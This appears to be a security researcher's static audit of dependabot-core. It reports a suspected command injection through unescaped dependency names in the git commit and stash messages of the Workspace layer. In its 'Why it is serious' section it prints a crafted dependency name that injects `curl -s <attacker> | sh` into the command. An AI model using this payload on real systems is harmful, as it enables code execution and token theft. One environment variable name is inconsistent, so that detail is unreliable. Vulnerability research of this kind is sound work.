# Deep Static Analysis — dependabot-core (cc2be3e / v0.403.0)

Scope: find a finding **more severe than VA-912** (Dependabot file fetcher clone-mode
symlink escape -> arbitrary host file READ, CVSS 7.5). VA-912 itself is NOT re-audited.

Method: read-only static analysis of `/tmp/dependabot-core`. No edits, no execution, no network.

---

## Summary

One **new candidate** is identified that is a code-execution / write primitive in the updater
container, strictly more severe than VA-912's arbitrary-file-read:

- **C1 (Command injection -> RCE in updater container)** — `Workspace::Git#commit` / `#stash`
  interpolate an attacker-controlled dependency name into a double-quoted shell string executed
  with `allow_unsafe_shell_command: true`. Reachable from grouped-update jobs.

No Free RCE / auth-bypass / cross-tenant / sandbox-escape that would rate Critical was confirmed.

---

## Code areas examined

| Area | File | Notes |
|------|------|-------|
| Job construction | `updater/lib/dependabot/job.rb`, `job/definition.rb`, `job/source_definition.rb` | Type-strict parsing; no unsafe deserialization. `job.clone?` gate drives workspace use. |
| File fetch base | `common/lib/dependabot/file_fetchers/base.rb` | VA-912 sink lines 256-277 (`File.read` 261, `symlink_target` 263 unvalidated). Clone command 933-937 escaped (default `allow_unsafe_shell_command: false`). |
| Workspace | `common/lib/dependabot/workspace/git.rb`, `workspace.rb` | **C1 sink.** |
| Group update orchestration | `updater/lib/dependabot/updater/group_update_creation.rb` | memo built line 744; `materialize_workspace_files` binwrite/symlink 687-709. |
| Update operations | `updater/lib/dependabot/updater/operations/create_group_update_pull_request.rb` (109-113), `refresh_group_update_pull_request.rb` (166-170) | reach C1. |
| Shell exec plumbing | `common/lib/dependabot/command_helpers.rb` (93-284, esp. `IO.popen` 243), `shared_helpers.rb` (138-151, 543-595) | show `allow_unsafe_shell_command: true` -> raw shell string. |
| Ecosystem shell callers | `npm_and_yarn/.../file_fetcher.rb:60-61` (`git lfs pull`), `devcontainers/.../config_updater.rb:96-106`, `python/.../pip_compile_file_updater.rb:155-160`, `uv/.../file_parser.rb:76-88`, `uv/.../compile_file_updater.rb:141`, `julia/.../registry_client.rb:359-371`, `composer/...`, `go_modules/...` | inventoried. |
| Git metadata / SSRF-adjacent | `common/lib/dependabot/git_metadata_fetcher.rb` (211-231, 342-377) | `git ls-remote`/`git clone` of attacker-chosen URL; escaped. |
| Deserialization | `common/lib/dependabot/config/file.rb:52` `YAML.safe_load`; `bin/dry-run.rb:477` `Marshal.load` (CLI only, cached local file) | no unsafe runtime `YAML.load`/`Marshal.load`/`JSON.load` on attacker data. |
| config / update_config | `common/lib/dependabot/config/file.rb`, `config/update_config.rb` | `exclude_paths` from YAML only. |
| Dependency model | `common/lib/dependabot/dependency.rb` | **no name validation / sanitization** — names pass through verbatim. |
| Source parsing | `common/lib/dependabot/source.rb` | GHES `hostname` from regex `[^/]+`; URL used in escaped clone. |
| Service / API | `updater/lib/dependabot/service.rb`, `api_client.rb` | localhost API env; no attacker-controlled SSRF target. |

---

## Candidate C1 — Command injection (RCE) via dependency name in git commit/stash message

### File:line
- `common/lib/dependabot/workspace/git.rb:133-137`

  ```ruby
  msg = memo || "workspace change"
  run_shell_command(
    %(git commit -m "#{msg}"),
    fingerprint: "git commit -m \"<msg>\"",
    allow_unsafe_shell_command: true
  )
  ```
- Same pattern at `git.rb:119-123` (`git stash push --all -m "#{msg}"`), memo from
  `capture_failed_change_attempt`.
- Memo source: `group_update_creation.rb:744` `Dependabot::Workspace.store_change(memo: "Updating #{dependency.name}")`, and `group_update_creation.rb:76` `stash(memo)` path.
- Dependency name is attacker-controlled: parsed from a manifest key (e.g. npm/yarn `dependencies`
  key, pip requirement name, etc.) and `Dependency` has **no name validation** (`dependency.rb`).

### Why it is serious
`run_shell_command` with `allow_unsafe_shell_command: true` passes the string verbatim to
`IO.popen` (`command_helpers.rb:243`) and the shell interprets it. The dependency name is inserted
inside double quotes without escaping. An attacker who controls a dependency name such as

```
foo" && curl -s <attacker> | sh && "
```

turns the command into

```
git commit -m "Updating foo" && curl -s <attacker> | sh && ""
```

→ arbitrary command execution in the updater process/container. This is a **write/RCE** primitive
(code execution, file write, env/token exfiltration) versus VA-912's read-only primitive.

### Prerequisites
1. Grouped-update job (`create_group_update_pull_request` / `refresh_group_update_pull_request`
   operations) — Dependabot user has configured `groups:` in dependabot.yml for an ecosystem whose
   parser passes dependency names verbatim (npm/yarn, pip, etc.).
2. `job.clone?` true and `DEPENDABOT_REPO_CONTENTS_PATH` set (same env gating as VA-912), so
   `prepare_workspace` (`group_update_creation.rb:677-684`) activates the git workspace.
3. The malicious dependency is updated (so `changes.any?` in `Workspace::Git#store_change` is true;
   `workspace.rb:39` guards on `changed_files`).

### Novelty gate vs VA-912
- Distinct sink: shell execution / `git commit` string (not `File.read`).
- Distinct impact: RCE / write in updater vs arbitrary host file read.
- Distinct boundary: Workspace git layer (not `load_cloned_file_if_present` symlink handling).
- PASSES novelty gate.

### Confidence
Medium-high. Injection mechanics are unambiguous given `allow_unsafe_shell_command: true` and
unescaped interpolation. Reachability depends on grouped updates + workspace configuration + the
specific ecosystem parser not sanitizing the name; several ecosystem parsers pass names verbatim.

---

## Other candidates considered (lower value / not exploitable cleanly)

- **C2 (SSRF-adjacent, low):** `git_metadata_fetcher.rb:216` `git ls-remote #{service_pack_uri}`
  and `:348` `git clone --bare #{uri}` use attacker-chosen URLs (dependency git source). They are
  escaped, so no command injection; they do make the updater contact attacker-selected hosts. Git
  protocol against internal services rarely returns secrets; low severity, not pursued.
- **C3 (not exploitable):** `npm_and_yarn file_fetcher.rb:61` `git lfs pull --include .yarn,#{cache_dir}`
  — `cache_dir` attacker-controlled via `.yarnrc.yml`, but `run_shell_command` default-escaping
  applies (no `allow_unsafe_shell_command`), so no injection.
- **C4 (none found):** no unsafe `YAML.load`/`Marshal.load`/`eval`/`system` on attacker data in
  runtime libs. `Marshal.load` only in `bin/dry-run.rb` (local CLI). `YAML.safe_load` used for
  config.

---

## Conclusion

No Critical / High-over-$5k finding is confirmed outright. The strongest NEW lead is **C1**:
token injection → RCE in the updater via the Workspace git commit/stash message when an
attacker-controlled dependency name reaches a grouped update. It passes the novelty gate distinct VA-912 and is more severe (code execution vs file read).

### Recommended next steps
1. Verify C1 reachability against a live grouped-update job (npm or pip) with a crafted dependency
   name, confirming `changes.any?` and that `WORK_MAGE_REPO_CONTENTS_PATH` is set in the target
   environment.
2. Audit each ecosystem parser to see which sanitize dependency names (only those that reject
   shell metacharacters are not affected).
3. If confirmed, assess sandbox/credential exposure of the updater container (GIT creds, job
   token) to size the severity.
